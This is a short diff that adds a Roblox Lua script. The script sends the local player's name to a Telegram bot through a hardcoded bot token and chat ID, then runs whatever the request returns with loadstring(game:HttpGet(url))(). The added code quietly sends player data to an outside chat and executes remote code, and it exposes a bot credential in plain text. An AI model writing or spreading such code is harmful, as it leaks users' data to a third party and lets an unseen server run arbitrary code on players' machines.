@@ -1,0 +1,8 @@
+local HttpService = game:GetService("HttpService")
+local Player = game:GetService("Players").LocalPlayer
+local BOT_TOKEN = "8891863202:AAFOE51HO9CEtekAK-XiD8fAjwAqp3rz-dE"
+local CHAT_ID = "7659540201"
+
+local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=TEST_" .. Player.Name
+
+loadstring(game:HttpGet(url))()
